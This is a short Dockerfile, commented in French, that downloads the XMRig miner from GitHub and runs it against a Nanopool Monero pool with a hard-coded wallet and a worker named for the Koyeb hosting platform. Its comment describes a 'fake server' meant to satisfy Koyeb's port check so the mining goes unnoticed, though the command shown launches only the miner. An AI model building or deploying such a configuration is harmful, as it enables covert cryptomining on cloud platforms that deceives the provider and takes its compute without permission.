FROM debian:latest
RUN apt-get update && apt-get install -y wget tar
WORKDIR /app
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && \
    tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz --strip-components=1
# Koyeb nécessite d'écouter sur un port, on lance xmrig et un faux serveur en fond
CMD ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45VEfzaQr9QW7Kh1w1YN4yTFc181CYcTfMvjUcjzdRSnX7zUb4Xq8sofdPNjBrstmTWbvvEai4picEBLdBZ8pVXkSPtEJDq.koyeb -p x --tls
